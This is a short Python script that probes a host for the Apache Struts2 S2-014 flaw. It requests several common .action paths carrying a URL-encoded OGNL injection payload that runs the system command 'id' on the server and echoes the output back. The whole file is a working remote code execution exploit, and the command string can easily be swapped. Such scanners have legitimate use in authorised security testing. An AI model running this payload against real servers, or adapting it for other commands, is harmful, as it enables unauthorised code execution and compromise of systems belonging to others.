try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs =  ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/link.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs :
                urls = 'http://' + url+":"+port+dir
                self.queues.put(urls)


    def Test(self):
        while not self.queues.empty():
            url = self.queues.get(False)
            try:
                req = requests.get(url + '''?a=%24{%23_memberAccess['allowStaticMethodAccess']%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime().exec('id').getInputStream()%2C%23b%3Dnew java.io.InputStreamReader(%23a)%2C%23c%3Dnew java.io.BufferedReader(%23b)%2C%23d%3Dnew char[50000]%2C%23c.read(%23d)%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse().getWriter()%2C%23out.println(%2bnew java.lang.String(%23d))%2C%23out.close()}''',timeout=3)
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-014 in ' + self.ip)
                    os._exit(1)
            except:
                pass
        logging.info('[-] S2-014 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    


